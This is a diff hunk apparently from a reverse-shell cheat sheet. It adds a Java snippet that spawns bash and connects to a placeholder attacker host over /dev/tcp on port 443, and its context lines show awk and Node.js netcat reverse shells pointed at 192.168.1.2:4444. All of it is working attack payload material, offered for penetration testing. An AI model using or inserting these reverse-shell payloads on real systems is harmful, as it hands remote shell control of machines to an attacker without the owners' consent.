@@ -122,6 +122,14 @@ awk 'BEGIN {s = "/inet/tcp/0/192.168.1.2/4444"; while(42) { do{ printf "shell>" 
 require('child_process').exec('nc -e /bin/sh 192.168.1.2 4444')
 ```
 
+### **Java Reverse Shell**
+
+```java
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/attackerip/443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+
 ### **C Reverse Shell**
 
 ```c
